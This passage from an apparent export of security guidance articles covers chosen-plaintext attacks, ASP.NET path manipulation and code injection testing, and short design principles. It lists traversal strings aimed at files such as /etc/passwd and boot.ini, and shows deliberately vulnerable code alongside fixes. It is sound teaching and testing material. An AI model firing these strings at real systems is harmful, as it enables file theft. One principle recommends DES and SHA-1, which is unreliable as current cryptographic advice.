system.&nbsp;</p><h2>Scenario 2:&nbsp; Adaptive or online chosen plaintext attack</h2><p>In an online chosen plaintext attack, the attacker starts by reading one or more plaintext blocks and their corresponding ciphertext.&nbsp;The attacker then generates new plaintext blocks based on information from previous sniffed packets.&nbsp;The attacker then forces the victim to encrypt the new plaintext blocks; and finally, the attacker reads the ciphertext produced by their chosen plaintext blocks.&nbsp;A common use of this attack is to steal sensitive information like passwords or credit card numbers.&nbsp; </p><p>For instance, the attacker starts monitoring encrypted network traffic between a client and server. After some analysis, the attacker realizes that the client password is sent at a specific offset of a packet (<em>C</em>). The attacker wants to know if the plaintext <em>P</em> that produced the encrypted password (<em>C</em>) is equivalent to another chosen plaintext <em>P';</em><em>.</em> If the system suffers from a chosen plaintext vulnerability, the attacker creates different plaintexts <em>Pk';</em> and forces the victim to use them in its following transmissions (which the attacker will also sniff).&nbsp; For each plaintext<em>Pk';</em> the attacker checks if the ciphertext <em>Ck';</em> is <em>equivalent</em> to <em>C.&nbsp;</em>If they are equivalent the chosen plaintext <em>Pk'; </em>is equal to the client's password:&nbsp;&nbsp; </p><p><em>C = E(K, P)&nbsp;&nbsp;&nbsp;&nbsp; </em></p><p><em>Ck'; = E(K, Pk';)</em></p><p>If <em>Ck'; </em><em>˜</em><em> C </em>then <em>Pk';= P.</em></p><p>If the attack is successful, the attacker controls <em>Pk';</em> and can read both <em>C</em> and <em>Ck';. </em>The only unknown values above are the encryption key (<em>K</em>)and the client's password (<em>P</em>).<em>&nbsp;&nbsp;</em>&nbsp;</p><p>Encryption systems require <em>block cipher modes</em> to allow for encryption of more than one cipher block.&nbsp;We say that a ciphertext in <em>Ck'; </em>must be to <em>equivalent</em> to<em>C </em>because <em>Ck'; </em>lives in a separate block (sent later) so it undergoes the cipher mode modification.&nbsp; Nonetheless, if the attacker deduces this equivalence, they can verify if any of the predicted passwords in <em>Pk';</em> are valid.&nbsp;A system that uses insecure cipher modes (such as ECB) or is poorly implemented (i.e. using a predictable initialization vector or <em>IV</em>) exposes itself to this variant [i] of attack.&nbsp; </p><h1>Step 2:&nbsp; Analyze Root Cause and Mitigations</h1><p>The next step is to analyze what causes chosen plaintext vulnerabilities and how to prevent them.&nbsp; Knowing the root cause of security vulnerabilities helps you to identify them in both design and implementation (source code).&nbsp;&nbsp; </p><h2>Root Causes</h2><p>Any design, implementation, configuration, or deployment condition that leads to an <em>attacker controlling the plaintext</em> <em>that the victim encrypts </em>is a root cause of a chosen plaintext bug.</p><p>However, it is difficult to pinpoint the actual root causes for this vulnerability.&nbsp; Picture a cryptography scenario wherein Alice sends Bob an encrypted message.&nbsp; Alice encrypts a message on her computer before sending it to Bob.&nbsp; An eavesdropper monitoring the encrypted communication is unable to change any of the plaintext; as the plaintext exists only on Alice's computer prior to encryption and transmission.&nbsp; </p><p>To execute a chosen plaintext attack, the adversary needs to somehow infiltrate the victim's machine, or remotely force the victim to select the plaintext of their choice.&nbsp; Any situation that allows a victim to encrypt the adversary's plaintext is a root cause of this vulnerability.&nbsp; The challenge here is that these circumstances might fall outside of the encryption system's responsibility.&nbsp; For example, the adversary might install a Trojan horse on Alice's computer which is then later used to replace any of Alice's plaintext before it is encrypted.&nbsp; If the plaintext is replaced with that of the adversary's choice, the resulting ciphertext is that of the chosen plaintext after encryption.&nbsp; The root cause here is that the victim previously allowed the attacker to install a trojan horse program, rather than a flaw in the encryption system itself.</p><h2>Mitigations</h2><p>Although there are multiple mitigations against this attack; none offer a complete solution.&nbsp; In order to exploit this vulnerability, the adversary must choose from different attack avenues such as installing spyware, remotely corrupting the victim's file system, or otherwise forcing the victim to append the attacker's plaintext as part of an encrypted message.&nbsp; Thus, possible mitigations include running up to date malware protection, hardening the operating system, and not including anonymous text in encrypted messages.&nbsp; This emphasizes that there are many mitigations to aid in preventing this attack, and a defense in depth approach must be taken to minimize the overall risk.</p><h1>Step 3:&nbsp; Start Testing and Exploring</h1><p>Now that you';ve learned about chosen plaintext attack scenarios, what causes them, and how to prevent them, you must test for secure and insecure implementations.</p><p><strong><em></em></strong></p><h2>Testing against an offline chosen plaintext attack</h2><ol><li>Select a victim. </li><li>Produce block(s) of plaintext that you wish to see enciphered. </li><li>Force the victim to encrypt the block(s) of plaintext produced in step 2. </li><li>Collect the resulting ciphertext for your chosen plaintext.</li></ol><p>Expected Result:&nbsp; The test succeeds if you can';t get the victim to encipher the produced plaintext block(s) (step 3).&nbsp; It fails if you are able to execute steps 3 and 4.&nbsp;</p><h2>Testing against an online chosen plaintext attack</h2><ol><li>Select a victim client. </li><li>Select a victim server. </li><li>Start sniffing network traffic between the client and server. </li><li>Read a number of messages between the server and the client. </li><li>Using information in the messages read, produce the plaintext you wish to force the server or the client to encrypt and send. </li><li>Force the victim server/client to encrypt the chosen plaintext from step 5. </li><li>Keep sniffing the network traffic until you see the resulting cipher text for the chosen plaintext in step 5.</li></ol><p>Expected Result:&nbsp; The test succeeds if you can';t get the server to encipher the chosen plaintext (step 6).&nbsp; It fails if you are able to execute steps 6 and 7.</p><p>These two high level cases show the basic details on how to test against a chosen plaintext attack.&nbsp; Make sure to cover both cases when testing your encryption system.&nbsp; During this step, you must be exploring ways of validating your test cases.&nbsp; You must find a way to verify that your chosen plaintext is actually being encrypted and to match your chosen plaintext with its encrypted equivalent.&nbsp; This will most likely require you to learn the protocol used between your target clients and servers, as well as exploration by trial and error.</p><h1>Step 4:&nbsp; Tune Test Cases</h1><p>Now that you';ve gone over the basic tests against chosen plaintext bugs, you must revise additional testing details and implications depending on the system under attack.</p><h3>Attack Avenues</h3><p>Chosen plaintext attacks have a fundamental requirement: <em>the adversary needs to trick the victim into encrypting his chosen plaintext.&nbsp; </em></p><p>A good example of applied chosen-plaintext testing attack avenues were presented along with an SSL chosen-plaintext vulnerability. &nbsp;You';ve also seen some examples above.&nbsp; This list presents a good set of attack avenues that you need to try:</p><ul><li>Installing spyware or Trojan horse in the victim's system that modifies the chosen plaintext before it is encrypted by the victim. </li><li>Sending the chosen plaintext to the target in an attempt that the victim encrypts it in a reply. </li><li>Storing the chosen plaintext in a data store that will be later encrypted by the victim. </li><li>Sending the chosen plaintext as part of a plug-in installation. </li><li>Hijacking an encryption API and executing the encryption function from the tester's console, with the chosen plaintext, but in the victim's context (impersonating the victim). </li><li>Executing arbitrary code in the victim's context that calls the encryption procedure from that victim's context.</li></ul><p>As you can see, there are many routes to test for chosen plaintext bugs; and additional exploits appear frequently in the Internet.&nbsp; It is important that you cover these routes and keep up with the latest attack avenues and techniques when testing against this class of bug.</p><br><h3>Attack Methods</h3><p>As seen, it is possible to execute two different attack methods by exploiting chosen plaintext bugs:</p><p><strong><em>Breaking Encryption</em></strong></p><p>The first method seen is that of recovering the encryption key of the encryption algorithm in use.&nbsp; In general cryptography, the encryption and decryption routines are publically known since they should not be broken in a feasible time period with a strong key length.&nbsp; However, sometimes cryptosystems utilize insufficiently large key sizes such as a 56-bit key paired with outdated algorithms like DES.&nbsp; There are different ways to break an encryption algorithm and recover the key using appropriate cryptanalysis [ii]&nbsp;methods, and this process can be much easier if the attacker has control of the plaintext.</p><p><strong><em>Stealing Sensitive Data </em></strong></p><p>In the second scenario you saw how to execute an information disclosure attack on the victim's password using a chosen plaintext bug.&nbsp; When executing this payload the attacker is not trying to calculate the encryption key.&nbsp; The attacker's goal is to reveal an unknown plaintext (The user's password.)&nbsp; The attacker has access to the ciphertext produced by the unknown plaintext.&nbsp; Furthermore, if a chosen plaintext bug exists, the attacker controls future plaintexts and therefore their resulting ciphertext.&nbsp; The attacker produces plaintexts to send in to the encryption systems, in hopes that one of them will be equal to the original plaintext; the attacker then compares the produced ciphertexts with the original ciphertext to see if the plaintext has been discovered.&nbsp;&nbsp;</p><p>Ensure that you focus on testing one attack method at a time, rather than trying to test both simultaneously.</p><h1>&nbsp;</h1><h1>Conclusions</h1><p>Chosen plaintext attacks are common in cryptography systems and have various potential implications.&nbsp; The attacker uses this class of attack to compute the system's private encryption key, or in an attempt to discover secret plaintext such as a password or credit card number.&nbsp; You must understand the basic attack scenarios for this class of attack, what causes them, and how to prevent them.&nbsp; Then, test your application through its different attack avenues to reveal any vulnerabilities in your system.&nbsp; Finish by tuning your test cases with the different attack methods presented here.</p><div><hr></div><p>[i] <strong>Vulnerability of SSL to Chosen-Plaintext Attack</strong>.<strong>&nbsp; </strong>Gregory V. Bard.&nbsp; May, 2004.&nbsp; <a href="http://citeseer.ist.psu.edu/cache/papers/cs/30519/http:zSzzSzeprint.iacr.orgzSz2004zSz111.pdf/bard04vulnerability.pdf">http://citeseer.ist.psu.edu/cache/papers/cs/30519/http:zSzzSzeprint.iacr.orgzSz2004zSz111.pdf/bard04vulnerability.pdf</a></p><p>[ii] <strong>Cryptanalysis</strong>. Wikipedia. &nbsp;<a href="http://en.wikipedia.org/wiki/Cryptanalysis">http://en.wikipedia.org/wiki/Cryptanalysis</a></p><div></div><ul></ul>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="245837273" Content_Hash="-1092316525">
    <Metadata>
      <Id>f9452ba5-cfe8-4d99-b52c-a00e1f927bbb</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>How to Test for Path Manipulation Bugs in ASP.NET</Title>
      <Category>Input and Data Validation</Category>
      <Phase>Test</Phase>
      <Technology>ASP.NET 3.5</Technology>
      <Type>How To</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority />
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>Summary</h1><p>In a path manipulation attack, an attacker submits certain input to alter an internal file path used by the application, forcing the application to use a malicious path. Attackers may exploit this bug to read sensitive files on the server such as configuration files or another user’s files, as well as to modify or delete server-side files. </p><p>Follow these steps to test for path manipulation bugs in ASP.NET:</p><ul><li>Step 1: Understand attack scenarios</li><li>Step 2: Analyze causes and countermeasures</li><li>Step 3: Start testing and exploring</li><li>Step 4: Execute additional testing</li></ul><p>&nbsp;</p><h1>Step 1: Understand Attack Scenarios</h1><p>The first step in testing for path manipulation bugs is to understand the anatomy of an attack scenario. </p><p>To exploit this vulnerability, the attacker manipulates a file path in an HTTP request. If the application is vulnerable, it uses the manipulated file path to perform a file system operation. The attack starts with the attacker discovering an HTTP request that invokes a server-side file system operation such as reading, modifying, deleting, emailing, or printing a file. This request comes either from a web page or from a client-side script (such as in AJAX applications) and contains a variable (URL parameter, web form input, etc) that the server uses to determine what file to handle. &nbsp;To execute the attack, the attacker submits the request but modifies this variable in an attempt to manipulate a server-side file, exploiting an intended functionality of the application for malicious purposes. If the attack is successful, the value provided by the attacker causes the server to access a file in a different path. In most cases, the attacker will be able to tell if the attack is successful shortly after executing it.</p><p>In detail:</p><ol><li>The attacker finds an HTTP request that invokes a file system operation at the server.</li><li>The attacker locates a variable in an HTTP request used to determine the path for a file system operation.</li><li>The attacker submits the request, but modifies the path determining variable and waits for a server response.</li><li>The attacker verifies if the attack is successful by observing the server’s response.</li></ol><h2><em><br>Attack Variants</em></h2><p>Attackers can employ path manipulation attacks to achieve different threats. For example, an attacker can manipulate a path to read server configuration and password files, or to read files belonging to another user, in order to execute an information disclosure attack on the application. &nbsp;Similarly, an attacker can manipulate a path to force the ASP.NET application into deleting a file needed to properly service its users, generating a denial of service situation.</p><p>&nbsp;</p><h1>Step 2: Analyze Causes and Countermeasures</h1><p>Next, before executing practical test cases, it is necessary to understand why these bugs exist and how to avoid them.</p><p>Path manipulation bugs affect ASP.NET applications that use input provided by clients to build a file path. For instance, the code below gets an input value from the user in an URL parameter named <em>filename</em>:</p><pre>string filename = "/public/user_files/" + <br>Server.UrlDecode(Request.QueryString["filename"]);&nbsp;&nbsp;&nbsp; <br>&nbsp;<br>StreamReader streamReader = new StreamReader(filename);<br>while (streamReader.Peek() &gt;= 0)<br>{<br>  Response.Write(streamReader.ReadLine());<br>}<br>streamReader.Close();</pre><br><p>If the user provides an expected file name such as <em>file.txt</em>, the application returns an expected user file:</p><pre>http://example.com.pe/example.aspx?filename=<strong>file.txt</strong></pre><p><strong></strong></p><p>However, during a path manipulation scenario, an attacker provides a malicious value for the variable, hoping that the application uses it to determine a different file path:&nbsp;</p><pre>http://example.com.pe/example.aspx?filename=<strong>../../private/secret.txt</strong></pre><p><strong></strong></p><p>The above string causes the application to go up two directories, navigate to the <em>private</em> folder, and display <em>secret.txt.</em> The example above is a common scenario of information disclosure due to path manipulation. Notice that the attack is possible because the code shown trusts the filename provided by the client; it starts by directly copying the input to the internal variable used to determine the filename, without properly validating it.</p><p>To protect against this bug ASP.NET applications must properly validate user input. Specifically, they must check if the input is safe to use in determining a file path. Developers can use blacklists that contain a list of all disallowed filename constructs such as “../” (without the quotes) and check if the user input appears in a blacklist. The problem with blacklists is that any variant of an attack that is not accounted for will execute unnoticed; to be effective, blacklists must account for all 100% of all attack variants -- which is unreasonable. The recommended approach to defend against this bug is to use <em>whitelists. </em>Whitelists specify only safe constructs, and disallow any user input that doesn’t match any of the specified safe constructs. By doing this, they only need to specify what is good and don’t have to account for 100% of all attack variants. </p><p>A common way of implementing a whitelist is by using a regular expression to specify what is safe and to disallow all input that doesn’t match the regular expression:</p><pre>Regex validFilename = new Regex("^[a-zA-Z]{4,8}\.txt$");<br>string input = Server.UrlDecode(Request.QueryString["filename"]);<br>&nbsp;<br>if (!validFilename.IsMatch(input))<br>{<br>  Response.Write("invalid input");<br>}<br>else<br>{<br>  string filename = "/public/user_files/" +<br>  &nbsp;&nbsp; Server.UrlDecode(Request.QueryString["filename"]);<br>&nbsp;<br>&nbsp;  StreamReader streamReader = new StreamReader(filename);<br>  while (streamReader.Peek() &gt;= 0)<br>  {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;     Response.Write(streamReader.ReadLine());<br>  }<br>  streamReader.Close();<br>}</pre><p>The input must consist of four to eight consecutive upper- or lower-case letters followed by the extension <em>“.txt”</em>. Any input that doesn’t match this form results in the application giving an <em>invalid input</em> error.</p><p>&nbsp;</p><h1>Step 3: Start Testing and Exploring</h1><p>Now that you’ve learned the common attack scenarios as well as the causes and countermeasures for path manipulation bugs, it is necessary to execute basic test cases to check if your application is vulnerable.</p><p>Success in testing for path manipulation bugs depends on your ability to determine the variables the application uses to build a file path. Applications commonly use URL and web form variables, so it is necessary to understand how to test through these two input points. </p><h2><em>Test for path manipulation in URL variables</em></h2><p>Follow these steps to test for path manipulation in an URL variable:</p><ol><li>Use an Internet browser to perform a file system operation. Note the URL used, such as <em>http://example.com.pe/example.asp?<strong>page=index.html</strong></em>.</li><li>Locate the URL variable used to by the application to determine the file name (in this case it is <em>page</em>).</li><li>Replace the value of the variable found in step 2 with an attack string (see Table 1). For instance: <em>http://example.com.pe/example.asp?page<strong>=</strong>../../../boot.ini</em>.</li><li>Submit request to application and wait for response.</li></ol><p>Expected results: The application must give an error message indicating that the file path has been manipulated. The application is vulnerable if it uses the path supplied in step 3 to determine the response and the attacker-specified file is used in the response.</p><h2><em>Test for path manipulation in web form variables</em></h2><p>Follow these steps to test for path manipulation through web forms:</p><ol><li>Navigate to a page containing a web form that prompts for a file name.</li><li>Locate the variable (input field) used by the application to determine the file name.</li><li>Enter an attack string in the field that indicates the filename (see Table 1). Here, it is important to disable any client-side checks that may deny entering an attack string due to illegal characters. For more information, read <em>How to - Test for Client-Side Validation Bypass Bugs</em>.</li><li>Submit the request to the application and wait for response.</li></ol><p>Expected results are the same as the previous test case.</p><h2><em>Attack strings</em></h2><p>The following attack strings contain path manipulation characters (dots, slashes, and backslashes) and common UNIX- and Windows-related file paths in different encodings. Depending on the relative location of the web application on the server, the number of “../” or “..\” clauses may need to be increased or decreased in order to realize an attack:</p><table><tbody><tr><td><pre>../etc/passwd<br>..\boot.ini<br>../boot.ini<br>folder_name/file_name<br>..\..\folder_name\file_name<br>../../folder_name/file_name<br>C:\boot.ini<br>%2e%2e\%2e%2e\<br>..%2f..%2f<br>%2e%2e%2f%2e%2e%2ffolder_name%2ffile_name<br>..%2f..%2ffolder_name%2ffile_name<br>..%c0%af..%c0%affolder_name..%c0%affile_name </pre></td></tr></tbody></table><br><p><strong>Table 1 - Path Manipulation Attack Strings</strong></p><h2><em>Look for error messages that indicate file operations</em></h2><p>While executing the basic test cases mentioned above, it is important to look for different type of error messages. For instance, “invalid input” or “incorrect format” error messages indicate that an application is safe, while “file not found” or HTTP 404 errors indicate that the application may be using the attack string to find a file in a different path and may be vulnerable to this bug.</p><p><strong>&nbsp;</strong></p><h1>Step 4: Execute Additional Testing</h1><p>Finally, it is important to execute additional testing for double encoding scenarios, as well as to cover all of the application’s input points.<strong><em></em></strong></p><h2><em>Cover double encoding scenarios</em></h2><p>Since this attack requires passing malicious input to a web application, it is necessary to add double encoding test cases for proper coverage. Double encoding consists of re-encoding the percent sign (%) in percent-encoded values with its percent-encoded equivalent (%25). For instance, translating the first URL into the second one:</p><pre>../../&nbsp; (no encoding)</pre><pre>..%2f..%2f&nbsp;&nbsp;&nbsp;&nbsp; (single encoding)</pre><pre>..%252f..%252f (double encoding)</pre><p>Make sure to add a double encoded test case for every attack string you use. For more information about double encoding attacks, read <em>How to - Test for Double Encoding Bugs.</em><em>&nbsp;</em></p><h2><em>Test through all input points</em></h2><p>Although path manipulation attacks commonly happen through the URL or web forms, it is important to look at additional application input points. Web applications can also take input from client cookies, web methods, extended frameworks (such as Flash/Flex), and third-party APIs (such as Facebook) parameters. Make sure to test for path manipulation in every place where input is taken.</p><p>&nbsp;</p><h1>Conclusions</h1><p>Path manipulation bugs allow attackers to access a server-side file to execute attacks such as information disclosure and denial of service. They occur because applications don’t properly validate user input against a white list and allow path manipulating characters such as dots and slashes to be processed by the application. To test for this vulnerability you must identify the file path determining variable, commonly sent in the URL or in a web form, and replace it with an attack string while looking for an error message that indicates that the attack string is being used. Finally, to achieve proper test coverage of this bug, be sure to consider double encoding scenarios and to test through all of the application’s input points.</p><p>&nbsp;</p><p>&nbsp;</p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="1813595236" Content_Hash="-1003024454">
    <Metadata>
      <Id>f9feb5d3-6509-4aa0-ad97-43d6ac17f697</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>How to Test for Server-Side Code Injection in ASP .NET</Title>
      <Category>Input and Data Validation</Category>
      <Phase>Test</Phase>
      <Technology>ASP.NET 3.5</Technology>
      <Type>How To</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority />
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1><p><strong></strong></p>Summary</h1><p>ASP .NET applications are hosted by a web server capable of interpreting and executing server-side code such as Active Server Pages (ASP files).&nbsp;&nbsp; A server-side code injection bug occurs when an attacker is able to inject additional server-side code that is then interpreted and executed as part of the application’s code; for instance, when the application dynamically evaluates data sent by its clients.&nbsp; An attacker might be able to submit malicious code and have the ASP .NET application dynamically evaluate the injected code.&nbsp; Attackers can exploit server-side code injection bugs to execute logical attacks on ASP .NET applications.</p><p>Follow these steps to test for server-side code injection in ASP .NET applications:</p><ul><li>Step 1: Understand attack scenarios </li><li>Step 2: Analyze causes and countermeasures </li><li>Step 3: Execute test cases</li></ul><p>&nbsp;</p><h1>Step 1: Understand attack scenarios</h1><p>The first step in learning how to test for server-side code injection bugs is to understand well the anatomy of a server-side code injection vulnerability in ASP .NET.</p><p>It is important to understand the difference between client-side code injection and server-side code injection.&nbsp; Client-side code injection occurs when an attacker uses a vulnerable web application to execute remote code in the client’s browser context.&nbsp; This is why client-side code injection exploits such as cross-site scripting (XSS) as well as AJAX injection attacks are written in JavaScript; the victim client’s browser must be able to interpret the exploit code.&nbsp;&nbsp;&nbsp; Server-side code injection aims at having the application’s web engine (such as ASP, JSP, etc.) interpret and execute the malicious code as part of the application.&nbsp;&nbsp;&nbsp; This means that an attacker that successfully exploits a server-side code injection bug will add an extra application functionality that executes with the same privileges of the application’s code.&nbsp;&nbsp; </p><p>ASP .NET web applications that dynamically evaluate scripts might be vulnerable to this attack.&nbsp;&nbsp;&nbsp; Consider an application that uses the following code:</p><pre>&lt;%<br>&nbsp;&nbsp;&nbsp; If Not Request("Code") = Nothing Then<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Dim fso, f<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'User input Code is written to a file named input.aspx<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fso = CreateObject("Scripting.FileSystemObject")<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; f = fso.OpenTextFile(Server.MapPath("input.aspx"), 8, True)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; f.Write(Request("Code") &amp; vbCrLf)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; f.close()<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; f = Nothing<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fso = Nothing<br>&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'input.aspx is executed<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <strong>Server.Execute("input.aspx")</strong><br>&nbsp;&nbsp;&nbsp; Else<br>%&gt;<br>&lt;form&gt;<br>&lt;input name="Code" size="100px" /&gt;&lt;input type="submit" name="Enter code" /&gt;<br>&lt;/form&gt;<br>&lt;%<br>End If<br>%&gt;<br><br></pre><p>The application dynamically evaluates the input data entered in the <em>Code</em> web form parameter.&nbsp; As a result, an attacker can pass malicious code that will be executed by the application at the server-side.</p><p>In detail:</p><ol><li>The attacker discovers an application functionality where client supplied input is dynamically evaluated and executed. </li><li>The attacker passes malicious code as input so that the application executes it at the server-side.</li></ol><p>&nbsp;</p><h1>Step 2: Analyze Causes and Countermeasures</h1><p>The following step in learning how to test for server-side code injection bugs is to understand what causes this attack and how to protect against it.&nbsp; </p><p>Server-side code injection in ASP .NET applications is possible due to dynamic code evaluation vulnerabilities.&nbsp; A dynamic code evaluation vulnerability occurs when the application uses client-supplied input for code evaluation and execution without doing proper input validation and sanitization.&nbsp;&nbsp; For example, in the previous scenario the application blindly constructs an input text file and, without checking for malicious code, invokes the <em>Server.Execute</em> function to evaluate and execute the newly created text file.</p><p>To protect against this bug, ASP .NET must properly validate any data before using it for dynamic evaluation such as when executing functions of the <em>Server.Execute</em> family.&nbsp; &nbsp;&nbsp;Developers are encouraged to create a <em>white list </em>containing a list of the valid data and code constructs.&nbsp; The application must then check that all parameters used in the dynamic evaluation appear in the white list and reject any input data that is not white-listed.</p><p><br>&nbsp;</p><h1>Step 3: Execute Test Cases</h1><p>Now that you’ve reviewed the theoretical aspects of server-side code injection bugs in ASP .NET it is necessary to execute the necessary test cases to check if your application is vulnerable.</p><h2><em>Test for Server-side code injection in ASP .NET</em></h2><p>Follow these steps:</p><ol><li>Discover a functionality in the application that performs dynamic code evaluation based on client supplied input. </li><li>Pass a small proof-of-concept ASP .NET code as input such as: <ul><li><pre>&lt;% Response.Write("Application is vulnerable") %&gt;</pre></li></ul></li><li>Observe how the application reacts to the injected code.</li></ol><p>Expected results:&nbsp; The application is vulnerable if it evaluates and executes the code passed in step 2 and displays the message <em>Application is vulnerable.</em></p><p>&nbsp;</p><h1>Conclusions</h1><p>Server-side code injection bugs allow attackers to inject code that will be executed by the ASP .NET engine that hosts the vulnerable application.&nbsp;&nbsp; Attackers can use server-side code injection to execute logical attacks on the target application.&nbsp; To learn how to test for this vulnerability it is necessary to understand its attack scenario and how it is possible in ASP .NET applications, as well as how to protect against it.&nbsp; Testing for this bug requires passing a small proof-of-concept code as input to the application under test while observing how the application reacts.</p><p>&nbsp;</p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="-571515989" Content_Hash="1723727406">
    <Metadata>
      <Id>399a0935-8990-49fb-b4ab-e04643429dbe</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Encrypt the Data or Secure the Communication Channel</Title>
      <Category>Sensitive Data</Category>
      <Phase>Design</Phase>
      <Technology> Any</Technology>
      <Type>Principle</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority />
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<br><h1>Description</h1><p>If you are sending sensitive data over the network to the client, encrypt the data or secure the channel. A common practice is to use SSL between the client and Web server. Between servers, an increasingly common approach is to use <a class="create" title="Click here to create this topic" href="http://www.guidancelibrary.com/wikiedit.aspx?topic=Home.IPSec&amp;return=Home.EncryptDataOrSecureChannel">IPSec</a>. For securing sensitive data that flows through several intermediaries, for example, Web service Simple Object Access Protocol (SOAP) messages, use message level encryption.</p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="-2113264258" Content_Hash="648007361">
    <Metadata>
      <Id>610ea4af-99d3-4077-b1ad-a785a8eb0052</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Use SSL to Protect Session Authentication Cookies</Title>
      <Category>Session Management</Category>
      <Phase>Design</Phase>
      <Technology> Any</Technology>
      <Type>Principle</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority />
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<br><h1>Description</h1><p>Do not pass authentication cookies over HTTP connections. Set the secure cookie property within authentication cookies, which instructs browsers to send cookies back to the server only over HTTPS connections. </p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="-296666045" Content_Hash="279882685">
    <Metadata>
      <Id>74b457be-5d2c-41ac-84dd-863d465a8511</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Don&amp;#39;t Trust User Input</Title>
      <Category>Input and Data Validation</Category>
      <Phase>Design</Phase>
      <Technology> Any</Technology>
      <Type>Principle</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority />
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<br><h1>Description</h1><p>Applications should thoroughly validate all user input before performing operations with that input. The validation may include filtering out special characters. This preventive measure protects the application against accidental misuse or deliberate attacks by people who are attempting to inject malicious commands into the system. Common examples include SQL injection attacks, cross-site scripting attacks, and buffer overflow. </p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="1039640730" Content_Hash="-1092325958">
    <Metadata>
      <Id>913e877c-8add-435b-9a0b-f2aaccb67665</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Use the Correct Algorithm and Correct Key Size</Title>
      <Category>Cryptography</Category>
      <Phase>Design</Phase>
      <Technology> Any</Technology>
      <Type>Principle</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority />
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<br><h1>Description</h1><p>It is important to make sure you choose the right algorithm for the right job and to make sure you use a key size that provides a sufficient degree of security. Larger key sizes generally increase security. The following list summarizes the major algorithms together with the key sizes that each uses: </p><ul><li>Data Encryption Standard (DES) 64-bit key (8 bytes) </li><li><a class="create" title="Click here to create this topic" href="http://www.guidancelibrary.com/wikiedit.aspx?topic=Home.TripleDES&amp;return=Home.UseCorrectAlgorithm">TripleDES</a> 128-bit key or 192-bit key (16 or 24 bytes) </li><li>Rijndael 128-256 bit keys (16-32 bytes) </li><li>RSA 384-16,384 bit keys (48-2,048 bytes) </li></ul><p>For large data encryption, use the <a class="create" title="Click here to create this topic" href="http://www.guidancelibrary.com/wikiedit.aspx?topic=Home.TripleDES&amp;return=Home.UseCorrectAlgorithm">TripleDES</a> symmetric encryption algorithm. For slower and stronger encryption of large data, use Rijndael. To encrypt data that is to be stored for short periods of time, you can consider using a faster but weaker algorithm such as DES. For digital signatures, use Rivest, Shamir, and Adleman (RSA) or Digital Signature Algorithm (DSA). For hashing, use the Secure Hash Algorithm (SHA)1.0. For keyed hashes, use the Hash-based Message Authentication Code (HMAC) <a class="create" title="Click here to create this topic" href="http://www.guidancelibrary.com/wikiedit.aspx?topic=Home.SHA1&amp;return=Home.UseCorrectAlgorithm">SHA1</a>.0.</p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="1913959117" Content_Hash="85297018">
    <Metadata>
      <Id>9d0ec95a-7749-4bb2-9822-bc909b496d20</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Constrain, Reject, and Sanitize Input</Title>
      <Category>Input and Data Validation</Category>
      <Phase>Design</Phase>
      <Technology> Any</Technology>
      <Type>Principle</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority />
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
